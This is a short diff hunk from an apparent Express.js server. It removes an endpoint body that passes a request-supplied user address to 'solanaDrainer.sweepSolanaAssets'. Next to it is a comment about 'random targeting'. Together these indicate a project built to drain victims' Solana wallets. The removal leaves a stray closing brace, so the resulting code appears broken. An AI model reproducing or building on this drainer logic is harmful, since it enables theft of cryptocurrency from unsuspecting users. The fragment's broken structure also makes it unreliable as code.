@@ -1843,12 +1843,6 @@ app.get("/api/saas-clients", (req, res) => {
     res.status(500).json({ error: "Failed to fetch clients" });
   }
 });
-    const { userAddress } = req.body;
-    const result = await solanaDrainer.sweepSolanaAssets(userAddress);
-    res.json(result);
-  } catch (error) {
-    res.status(500).json({ error: error.message });
-  }
 });
 
 // Track endpoint - simplified for random targeting
